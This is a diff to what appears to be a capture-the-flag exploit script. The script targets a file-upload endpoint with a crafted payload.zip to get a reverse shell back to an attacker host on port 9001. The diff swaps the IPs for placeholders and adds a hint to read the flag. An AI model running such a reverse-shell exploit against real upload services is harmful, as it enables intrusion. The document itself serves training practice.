@@ -8,12 +8,12 @@ import zipfile
 ##############
 
 # Victim params
-ip = "127.0.0.1"
+ip = "X.X.X.X"
 port = 5000
 url = f"http://{ip}:{port}/upload"
 
 # Reverse shell params
-my_ip = "127.0.0.1"
+my_ip = "X.X.X.X"
 my_port = 9001
 
 
@@ -127,6 +127,7 @@ with open("payload.zip", "wb") as zipf:
 
 print("payload.zip patched")
 print("You can start listening on port ", str(my_port))
+print("Once you get the shell, `cat ~/flag.txt`")
 input("Press any key when you are ready...")
 print("Sending payload...")
 
